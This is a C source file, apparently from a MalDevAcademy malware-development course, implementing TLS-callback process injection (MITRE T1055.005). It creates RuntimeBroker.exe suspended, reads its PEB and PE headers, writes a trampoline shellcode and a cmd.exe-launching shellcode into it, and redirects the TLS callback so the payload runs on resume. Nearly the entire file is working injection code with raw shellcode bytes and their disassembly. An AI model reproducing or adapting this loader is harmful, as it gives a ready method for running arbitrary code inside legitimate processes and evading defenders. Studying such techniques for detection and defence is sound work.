// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

/*
	[MITRE ATT&CK] Process Injection: Thread Local Storage - https://attack.mitre.org/techniques/T1055/005/
*/ 


/*
	First shellcode - Based on: https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L67

	; Saving arguments
	0:  51                      push   rcx
	1:  52                      push   rdx
	2:  41 51                   push   r9
	4:  41 50                   push   r8
	6:  41 53                   push   r11
	8:  41 52                   push   r10
	
	; Restoring the original TLS callback address
	a:  48 bb bb bb bb bb bb    movabs rbx,0xbbbbbbbbbbbbbbbb		; 0xbbbbbbbbbbbbbbbb is at the 12th byte. 
	11: bb bb bb
	14: 48 b9 cc cc cc cc cc    movabs rcx,0xcccccccccccccccc		; 0xcccccccccccccccc is at the 22th byte. 
	1b: cc cc cc
	1e: 48 89 0b                mov    QWORD PTR [rbx],rcx

	; Calling VirtualProtect after restoring the original TLS callback
	21: 48 83 ec 50             sub    rsp,0x50
	25: 48 89 d9                mov    rcx,rbx
	28: 48 c7 c2 00 04 00 00    mov    rdx,0x400
	2f: 41 b8 02 00 00 00       mov    r8d,0x2
	35: 4c 8d 4c 24 20          lea    r9,[rsp+0x20]
	3a: 48 b8 bb bb bb bb bb    movabs rax,0xbbbbbbbbbbbbbbbb		; 0xbbbbbbbbbbbbbbbb is at the 60th byte.
	41: bb bb bb
	44: ff d0                   call   rax

	; Calling the main payload
	46: e8 0f 00 00 00          call   5a <shellcode>
	4b: 48 83 c4 50             add    rsp,0x50

	; Restoring orignal arguments
	4f: 41 5a                   pop    r10
	51: 41 5b                   pop    r11
	53: 41 58                   pop    r8
	55: 41 59                   pop    r9
	57: 5a                      pop    rdx
	58: 59                      pop    rcx
	59: c3			    ret
shellcode:
*/


unsigned char g_FixedShellcode[] = {
	0x51, 0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48,
	0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0x48, 0xB9,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x0B,
	0x48, 0x83, 0xEC, 0x50, 0x48, 0x89, 0xD9, 0x48, 0xC7, 0xC2, 0x00,
	0x04, 0x00, 0x00, 0x41, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x4C, 0x8D,
	0x4C, 0x24, 0x20, 0x48, 0xB8, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,
	0xBB, 0xBB, 0xFF, 0xD0, 0xE8, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x83,
	0xC4, 0x50, 0x41, 0x5A, 0x41, 0x5B, 0x41, 0x58, 0x41, 0x59, 0x5A,
	0x59, 0xC3 
};

// ========================================================================================================================

/*
	Patch the 'g_FixedShellcode' shellcode with runtime values
*/
BOOL PatchShellcode(IN HANDLE hProcess, IN ULONG_PTR uImgTlsCallback) {

	BOOL			bResult				= FALSE;
	ULONG_PTR		uImgTlsCallbackBytes		= NULL,
				uVirtualProtect			= VirtualProtect;
	SIZE_T			sNumberOfBytesRead		= 0x00;
	unsigned long long	ullOriginalBytes		= 0x00;

	if (!(uImgTlsCallbackBytes = LocalAlloc(LPTR, 0x10))) {
		printf("[i] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadProcessMemory(hProcess, uImgTlsCallback, uImgTlsCallbackBytes, 0x10, &sNumberOfBytesRead) || sNumberOfBytesRead != 0x10) {
		printf("[!] ReadProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// ullOriginalBytes is the first 8 bytes before the patch 
	ullOriginalBytes = *(unsigned long long*)uImgTlsCallbackBytes;

	// rbx = uImgTlsCallback
	memcpy(&g_FixedShellcode[12], &uImgTlsCallback, sizeof(uImgTlsCallback));

	// rcx = 8 original bytes
	memcpy(&g_FixedShellcode[22], &ullOriginalBytes, sizeof(ullOriginalBytes));

	// rax = VirtualProtect
	memcpy(&g_FixedShellcode[60], &uVirtualProtect, sizeof(unsigned long long));


	bResult = TRUE;

_END_OF_FUNC:
	if (uImgTlsCallbackBytes)
		LocalFree(uImgTlsCallbackBytes);
	return bResult;
}


// ========================================================================================================================

/*
	x64 cmd.exe shellcode - Based on: https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L18

	0:  53                      push   rbx
	1:  56                      push   rsi
	2:  57                      push   rdi
	3:  55                      push   rbp
	4:  54                      push   rsp
	5:  58                      pop    rax
	6:  66 83 e4 f0             and    sp,0xfff0
	a:  50                      push   rax
	b:  6a 60                   push   0x60
	d:  5a                      pop    rdx
	e:  68 63 6d 64 00          push   0x646d63
	13: 54                      push   rsp
	14: 59                      pop    rcx
	15: 48 29 d4                sub    rsp,rdx
	18: 65 48 8b 32             mov    rsi,QWORD PTR gs:[rdx]
	1c: 48 8b 76 18             mov    rsi,QWORD PTR [rsi+0x18]
	20: 48 8b 76 10             mov    rsi,QWORD PTR [rsi+0x10]
	24: 48 ad                   lods   rax,QWORD PTR ds:[rsi]
	26: 48 8b 30                mov    rsi,QWORD PTR [rax]
	29: 48 8b 7e 30             mov    rdi,QWORD PTR [rsi+0x30]
	2d: 03 57 3c                add    edx,DWORD PTR [rdi+0x3c]
	30: 8b 5c 17 28             mov    ebx,DWORD PTR [rdi+rdx*1+0x28]
	34: 8b 74 1f 20             mov    esi,DWORD PTR [rdi+rbx*1+0x20]
	38: 48 01 fe                add    rsi,rdi
	3b: 8b 54 1f 24             mov    edx,DWORD PTR [rdi+rbx*1+0x24]
	3f: 0f b7 2c 17             movzx  ebp,WORD PTR [rdi+rdx*1]
	43: 8d 52 02                lea    edx,[rdx+0x2]
	46: ad                      lods   eax,DWORD PTR ds:[rsi]
	47: 81 3c 07 57 69 6e 45    cmp    DWORD PTR [rdi+rax*1],0x456e6957
	4e: 75 ef                   jne    0x3f
	50: 8b 74 1f 1c             mov    esi,DWORD PTR [rdi+rbx*1+0x1c]
	54: 48 01 fe                add    rsi,rdi
	57: 8b 34 ae                mov    esi,DWORD PTR [rsi+rbp*4]
	5a: 48 01 f7                add    rdi,rsi
	5d: 99                      cdq
	5e: 48 c7 c2 05 00 00 00    mov    rdx,0x5
	65: ff d7                   call   rdi
	67: 48 83 c4 68             add    rsp,0x68
	6b: 5c                      pop    rsp
	6c: 5d                      pop    rbp
	6d: 5f                      pop    rdi
	6e: 5e                      pop    rsi
	6f: 5b                      pop    rbx
	70: c3                      ret
*/

unsigned char rawData[] = {
	0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
	0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00, 0x54, 0x59, 0x48, 0x29, 0xD4,
	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0x48, 0xC7, 
	0xC2, 0x05, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x68, 0x5C,
	0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

// ========================================================================================================================

/*
	Create process
*/
BOOL CreateProcessViaWinAPIsW(IN LPWSTR szProcessImgNameAndParms, IN OPTIONAL DWORD dwFlags, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!szProcessImgNameAndParms || !pProcessInfo)
		return FALSE;

	STARTUPINFOW		StartupInfo		= { .cb = sizeof(STARTUPINFOW) };
	DWORD			dwCreationFlags		= dwFlags;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));

	if (!CreateProcessW(NULL, szProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessW Failed with Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
} 

// ========================================================================================================================

/*
	Write the main shellcode in addition to the g_FixedShellcode shellcode 
*/
BOOL WritePayloadRemotely(IN HANDLE hProcess, IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress) {

	HANDLE		hThread			= NULL;
	DWORD		dwOldProtection		= 0x00;
	SIZE_T		sNmbrOfBytesWritten 	= NULL;

	if (!hProcess || !pShellcodeBuffer || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(*ppInjectionAddress = VirtualAllocEx(hProcess, NULL, (sShellcodeSize + sizeof(g_FixedShellcode)), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAllocEx Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	// Writing the g_FixedShellcode shellcode first
	if (!WriteProcessMemory(hProcess, *ppInjectionAddress, g_FixedShellcode, sizeof(g_FixedShellcode), &sNmbrOfBytesWritten) || sizeof(g_FixedShellcode) != sNmbrOfBytesWritten) {
		printf("[!] WriteProcessMemory [%d] Failed With Error: %d\n[i] Wrote %d Of %d Bytes \n", __LINE__, GetLastError(), (int)sNmbrOfBytesWritten, (int)sizeof(g_FixedShellcode));
		return FALSE;
	}

	sNmbrOfBytesWritten = 0x00;

	// Writing the main shellcode directly under the g_FixedShellcode shellcode
	if (!WriteProcessMemory(hProcess, (*ppInjectionAddress + sizeof(g_FixedShellcode)), pShellcodeBuffer, sShellcodeSize, &sNmbrOfBytesWritten) || sShellcodeSize != sNmbrOfBytesWritten) {
		printf("[!] WriteProcessMemory [%d] Failed With Error: %d\n[i] Wrote %d Of %d Bytes \n", __LINE__, GetLastError(), (int)sNmbrOfBytesWritten, (int)sizeof(g_FixedShellcode));
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, *ppInjectionAddress, (sShellcodeSize + sizeof(g_FixedShellcode)), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		return FALSE;
	}

	return TRUE;
}

// ========================================================================================================================

BOOL ChangeRemoteTLSCallbackArray(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeSize) {

	if (!hProcess || !hThread)
		return FALSE;

	ULONG_PTR		uImageBase		= NULL,
				uImageBaseBuffer	= NULL,
				uInjectionAddress	= NULL;
	PIMAGE_NT_HEADERS	pImgNtHdrs		= NULL;
	PIMAGE_DATA_DIRECTORY	pEntryTLSDataDir	= NULL;
	PIMAGE_TLS_CALLBACK	pImgTlsCallback		= NULL;
	DWORD			dwOldProtection		= 0x00;
	CONTEXT			ThreadContext		= { .ContextFlags = CONTEXT_ALL };	
	BOOL			bResult			= FALSE; 

	// Get PPEB
	if (!GetThreadContext(hThread, &ThreadContext)) {
		printf ("[!] GetThreadContext Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	printf("[i] PPEB Address: 0x%p \n", (void*)ThreadContext.Rdx);
	printf("[i] Calculated Image Base Address To Be At: 0x%p \n", (void*)(ThreadContext.Rdx + offsetof(PEB, Reserved3[1])));

	// Fetch The Base Address Of The Image
	if (!ReadProcessMemory(hProcess, (PVOID)(ThreadContext.Rdx + offsetof(PEB, Reserved3[1])), &uImageBase, sizeof(PVOID), NULL)) {
		printf("[!] ReadProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		return FALSE;
	}

	printf("[*] Image Base Address: 0x%p \n", (void*)uImageBase);

	// Read The PE Headers Of The Image (0x1000 - 4096)
	if (!(uImageBaseBuffer = LocalAlloc(LPTR, 0x1000))) {
		printf("[i] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	if (!ReadProcessMemory(hProcess, (PVOID)uImageBase, uImageBaseBuffer, 0x1000, NULL)) {
		printf("[!] ReadProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[#] Press <ENTER> To Continue ... ");
	getchar();

//	--------------------------------------------------------------------------------------------------------------------------------------------

	// Fetching the TLS callback address
	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uImageBaseBuffer + ((PIMAGE_DOS_HEADER)uImageBaseBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	pEntryTLSDataDir = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	if (!pEntryTLSDataDir->Size) {
		printf("[!] Remote Process Does Not Have Any TLS Callback Function\n");
		goto _END_OF_FUNC;
	}

	// Reading the address of the callback function
	if (!ReadProcessMemory(hProcess, uImageBase + pEntryTLSDataDir->VirtualAddress + offsetof(IMAGE_TLS_DIRECTORY, AddressOfCallBacks), &pImgTlsCallback, sizeof(PVOID), NULL)) {
		printf("[!] ReadProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[*] pImgTlsCallback Should Be At: 0x%p \n", (void*)(uImageBase + pEntryTLSDataDir->VirtualAddress + offsetof(IMAGE_TLS_DIRECTORY, AddressOfCallBacks)));
	printf("[*] pImgTlsCallback: 0x%p \n", pImgTlsCallback);
	printf("[#] Press <ENTER> To Continue ... ");
	getchar();

//	--------------------------------------------------------------------------------------------------------------------------------------------
	// Inject both shellcodes 

	printf("[i] Patching First Shellcode ... ");
	if (!PatchShellcode(hProcess, pImgTlsCallback)) {
		goto _END_OF_FUNC;
	}
	printf("[+] DONE \n");

	if (!WritePayloadRemotely(hProcess, pShellcodeBuffer, sShellcodeSize, &uInjectionAddress)) {
		goto _END_OF_FUNC;
	}

	printf("[*] Shellcode Injected At: 0x%p \n", (void*)uInjectionAddress);
	printf("[#] Press <ENTER> To Continue ... ");
	getchar();

//	--------------------------------------------------------------------------------------------------------------------------------------------

	// Writing the address of the shellcode instead of the address of the TLS callback function
	if (!VirtualProtectEx(hProcess, pImgTlsCallback, 0x400, PAGE_READWRITE, &dwOldProtection)){
		printf("[!] VirtualProtectEx [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// Change the TLS callback to point to the shellcode
	if (!WriteProcessMemory(hProcess, pImgTlsCallback, &uInjectionAddress, sizeof(PVOID), NULL)) {
		printf("[!] WriteProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[+] TLS Callback Changed To Point To: 0x%p \n", (void*)uInjectionAddress);

	/*
	// This is executed by our shellcode after restoring the original bytes
	if (!VirtualProtectEx(hProcess, pImgTlsCallback, 0x400, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}
	*/

//	--------------------------------------------------------------------------------------------------------------------------------------------

	bResult = TRUE;

_END_OF_FUNC:
	if (uImageBaseBuffer)
		LocalFree(uImageBaseBuffer);
	return bResult;
}

// ========================================================================================================================

int main() {
	
	PROCESS_INFORMATION	ProcessInfo		= { 0x00 };
	WCHAR			szProcessName[]		= L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding";

	// Create a suspended process
	if (!CreateProcessViaWinAPIsW(szProcessName, CREATE_SUSPENDED, &ProcessInfo)) {
		return -1;
	}

	if (!ProcessInfo.hProcess || !ProcessInfo.hThread)
		return -1;

	printf("[*] Target Process Created With PID: %d \n", ProcessInfo.dwProcessId);
	printf("[#] Press <ENTER> To Continue ... ");
	getchar();
	
	// Inject the Shellcode and execute it by making the TLS callback of the remote process point to our shellcode
	if (!ChangeRemoteTLSCallbackArray(ProcessInfo.hProcess, ProcessInfo.hThread, rawData, sizeof(rawData))) {
		TerminateProcess(ProcessInfo.hProcess, 0);
		return -1;
	}

	// Resume the process
	ResumeThread(ProcessInfo.hThread);

	return 0;
}
